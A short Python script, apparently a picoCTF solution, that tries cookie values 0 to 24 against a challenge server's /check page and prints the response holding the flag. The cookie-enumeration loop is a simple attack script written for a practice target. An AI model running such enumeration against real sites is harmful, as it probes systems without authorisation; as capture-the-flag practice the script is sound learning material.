#!/bin/env python3
import requests
import re

# # POC
# url = "http://mercury.picoctf.net:54219/check"
# cookies = {'name': '1'}
# r = requests.get(url, cookies=cookies)

# # search will return None if 'picoCTF' not found
# search = re.search('picoCTF', r.text)
# print(search)



s = requests.Session()

# Let's automate this
for i in range(25):
    cookie = 'name={}'.format(i)
    headers = {'Cookie':cookie}
    url = "http://mercury.picoctf.net:54219/check"
    r = requests.get(url, headers=headers)
    print("Cookie value = ", i)
    if (r.status_code == 200) and ('picoCTF' in r.text):
        print("Found flag at cookie value ", i)
        print(r.text)   

s.close()